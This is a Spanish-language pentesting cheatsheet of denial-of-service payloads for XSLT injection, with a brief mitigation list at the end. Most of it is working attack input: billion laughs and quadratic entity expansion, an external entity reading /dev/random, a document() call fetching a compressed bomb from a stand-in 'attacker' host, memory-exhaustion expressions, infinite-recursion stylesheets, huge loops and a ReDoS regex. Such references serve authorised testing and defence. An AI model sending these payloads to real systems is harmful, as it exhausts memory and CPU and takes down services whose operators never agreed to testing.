---
aliases:
  - XSLT DoS
  - XSLT Billion Laughs
  - XSLT Recursion DoS
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
  - '[[XML External Entity (XXE)]]'
---
# XSLT - DoS

***

## Billion Laughs / Expansión Exponencial

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Billion Laughs clásico | `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">...]>` | Si parser permite DTDs y no tiene entity expansion limit. |
| Billion Laughs XSLT estilo | `<xsl:variable name="a" select="'A'"/><xsl:variable name="b" select="concat($a,$a,$a,$a,$a,$a,$a,$a,$a,$a)"/><xsl:variable name="c" select="concat($b,$b,$b,$b,$b,$b,$b,$b,$b,$b)"/>...` | Cadena recursiva sin DTDs — funciona aunque DOCTYPE bloqueado. |
| Quadratic blowup | `<!DOCTYPE z [<!ENTITY x "AAAAAAAAAAAAAAAAA...x10000">]><doc>&x;&x;&x;...&x;</doc>` | Una sola entity grande, repetida muchas veces. |
| External entity DoS | `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///dev/random">]><doc>&xxe;</doc>` | Lectura infinita de `/dev/random` cuelga el motor. |
| Compressed bomb (zip) | `<xsl:value-of select="document('http://attacker/bomb.xml.gz')"/>` | Si el motor descomprime auto. |
| Memory exhaustion | `<xsl:variable name="big" select="string-join(for $i in 1 to 100000 return 'AAAAAAAAAAAAAAAAAAAA','')"/>` | Concat masivo en memoria. |
^xslt-dos-billion

### Billion Laughs completo

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol  "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&lol9;</output>
  </xsl:template>
</xsl:stylesheet>
```

`&lol9;` = 10⁹ chars = ~1 GB en memoria.

___

## Recursión Infinita / Loops

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Template autorrecursivo | `<xsl:template name="loop"><xsl:call-template name="loop"/></xsl:template><xsl:template match="/"><xsl:call-template name="loop"/></xsl:template>` | Sin caso base — pila explota. |
| Recursión con param | `<xsl:template name="r"><xsl:param name="i"/><xsl:call-template name="r"><xsl:with-param name="i" select="$i + 1"/></xsl:call-template></xsl:template>` | Stack overflow en motores sin tail-call. |
| For-each gigante (2.0+) | `<xsl:for-each select="1 to 999999999"><xsl:value-of select="."/></xsl:for-each>` | Loop de 10⁹ iteraciones. |
| Producto cartesiano | `<xsl:for-each select="1 to 100000"><xsl:for-each select="1 to 100000">x</xsl:for-each></xsl:for-each>` | 10¹⁰ ops. |
| Regex catastrófico | `<xsl:value-of select="matches($s, '(a+)+$')"/>` | ReDoS si la string termina sin `a`. |
| Sort sobre infinitos | `<xsl:perform-sort select="1 to 999999"><xsl:sort select="."/></xsl:perform-sort>` | Sort sobre rango grande. |
| Recursión vía apply-templates | `<xsl:template match="*"><xsl:copy><xsl:apply-templates select="."/></xsl:copy></xsl:template>` | Self-apply sin avance — loop infinito. |
^xslt-dos-recursion

### Stylesheet completo recursión infinita

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template name="forever">
    <xsl:call-template name="forever"/>
  </xsl:template>
  <xsl:template match="/">
    <xsl:call-template name="forever"/>
  </xsl:template>
</xsl:stylesheet>
```

### Mitigación defender

- Saxon: `setMessageEmitter` con timeout, `XPathException` budget.
- libxslt: `XSLT_MAX_DEPTH` (default 3000), `XSLT_MAX_VARS`.
- .NET XslCompiledTransform: `XsltSettings.EnableDocumentFunction = false` no afecta — usar timeout en host.
- Limitar tiempo de transformación: 1-5s max por proceso transformador.
- Disable DTDs en parser XML: `feature: disallow-doctype-decl = true`.

***
